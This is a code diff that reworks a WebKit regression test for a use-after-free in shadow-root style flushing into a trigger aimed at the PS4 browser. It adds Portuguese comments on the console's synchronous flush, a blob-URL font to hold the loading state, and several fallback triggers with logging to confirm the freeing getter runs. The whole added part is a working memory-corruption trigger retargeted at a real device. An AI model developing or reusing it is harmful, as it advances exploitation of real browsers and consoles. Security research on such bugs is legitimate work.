@@ -1,33 +1,34 @@
+
 <!DOCTYPE html>
 <html>
 <body>
 <script>
-// Style::Scope::flushPendingDescendantUpdates() used to walk
-// Document::m_inDocumentShadowRoots (a WeakListHashSet) with a live iterator while
-// making a per-root flushPendingUpdate() callout. That callout re-registers the
-// shadow scope's @font-face rules, which removes the previous CSSFontFace; when that
-// face is the only loading one, document.fonts.ready settles synchronously and its
-// thenable assimilation runs an author getter. Disconnecting the iterated shadow
-// root from that getter frees the list node the iterator points at.
-// Touch document.fonts before the load event so that FontFaceSet is marked as
-// document-loaded; completedLoading() only settles the ready promise in that state.
+// CORRECAO PRINCIPAL:
+// No PS4, o flush ocorre DURANTE o shadowRoot.prepend() (eager flush síncrono).
+// O getter precisa estar instalado ANTES do prepend, não depois.
+
 document.fonts;
 
-function log(message)
-{
-    document.body.appendChild(document.createTextNode(message));
+function log(msg) {
+    document.body.appendChild(document.createTextNode(msg));
     document.body.appendChild(document.createElement("br"));
 }
 
-function run()
-{
+function run() {
     const host = document.createElement("div");
     document.body.appendChild(host);
     const shadowRoot = host.attachShadow({ mode: "open" });
 
+    // Blob URL: loading state garantido durante toda execucao sincrona
+    const fakeOtf = new Uint8Array(500 * 1024);
+    for (let i = 0; i < fakeOtf.length; i++) fakeOtf[i] = i & 0xFF;
+    const blob = new Blob([fakeOtf], { type: "font/otf" });
+    const blobUrl = URL.createObjectURL(blob);
+
     const fontFaceStyle = document.createElement("style");
-    fontFaceStyle.textContent = `@font-face { font-family: reentryFont; src: url("resources/no-such-font-for-reentry.otf"); }`
-        + `.probe { font: 24px reentryFont; }`;
+    fontFaceStyle.textContent =
+        `@font-face { font-family: reentryFont; src: url("${blobUrl}"); }` +
+        `.probe { font: 24px reentryFont; }`;
     shadowRoot.appendChild(fontFaceStyle);
 
     const probe = document.createElement("span");
@@ -35,37 +36,62 @@ function run()
     probe.textContent = "A";
     shadowRoot.appendChild(probe);
 
-    document.body.offsetHeight; // Force layout so the font load starts.
+    document.body.offsetHeight;
     document.fonts.load("24px reentryFont", "A");
-    log("document.fonts.status: " + document.fonts.status);
+    log("status: " + document.fonts.status);
 
-    // Materialize the JS promise for the ready proxy that startedLoading() re-armed,
-    // so that settling it goes through JSPromise::resolve() and its thenable check.
+    // Materializa a promise ANTES do getter (necessario para thenable assimilation)
     document.fonts.ready;
 
-    // Give the shadow scope a pending UpdateType::ActiveSet whose flush takes the
-    // ResolverUpdateType::Reset path, so all of its sheets (including the @font-face
-    // one) get re-processed. Prepending rather than appending is what makes
-    // analyzeStyleSheetChange() pick Reset.
-    const prependedStyle = document.createElement("style");
-    prependedStyle.textContent = ".unused { color: red; }";
-    shadowRoot.prepend(prependedStyle);
-
+    // ============================================================
+    // CORRECAO: instalar getter ANTES do prepend
+    // O PS4 faz flush síncrono durante prepend(), o getter
+    // precisa estar no lugar quando flushPendingDescendantUpdates()
+    // chamar completedLoading() → resolve fonts.ready
+    // ============================================================
     let getterCallCount = 0;
     Object.defineProperty(FontFaceSet.prototype, "then", {
         configurable: true,
         get() {
             delete FontFaceSet.prototype.then;
             ++getterCallCount;
-            host.remove(); // Frees the iterated Document::m_inDocumentShadowRoots node.
+            log(">>> GETTER DISPAROU! count=" + getterCallCount);
+            // Remove o host: libera o no iterado em m_inDocumentShadowRoots → UAF
+            host.remove();
             return undefined;
         }
     });
+    log("getter instalado. status=" + document.fonts.status);
 
-    document.styleSheets.length; // Reaches Scope::flushPendingDescendantUpdates().
+    // O prepend agora encontra o getter no lugar
+    // No PS4: prepend → flush síncrono → completedLoading → fonts.ready settle
+    //         → thenable check em FontFaceSet → getter DISPARA → host.remove()
+    const prependedStyle = document.createElement("style");
+    prependedStyle.textContent = ".unused { color: red; }";
+    shadowRoot.prepend(prependedStyle);  // ← flush acontece AQUI
 
-    log("FontFaceSet.prototype.then getter calls: " + getterCallCount);
-    log("PASS if no crash.");
+    log("apos prepend: getter=" + getterCallCount + " status=" + document.fonts.status);
+
+    // Triggers adicionais caso o flush seja lazy no PS4
+    if (getterCallCount === 0) {
+        document.styleSheets.length;
+        log("apos styleSheets.length: getter=" + getterCallCount);
+    }
+    if (getterCallCount === 0) {
+        document.body.offsetHeight;
+        log("apos offsetHeight: getter=" + getterCallCount);
+    }
+    if (getterCallCount === 0) {
+        const canvas = document.createElement("canvas");
+        canvas.getContext("2d").font = "24px reentryFont";
+        canvas.getContext("2d").measureText("A");
+        log("apos measureText: getter=" + getterCallCount);
+    }
+
+    log("--- RESULTADO ---");
+    log("getter total: " + getterCallCount);
+    log("status final: " + document.fonts.status);
+    log("PASS se nao travou.");
 }
 
 window.addEventListener("load", () => setTimeout(run, 0));
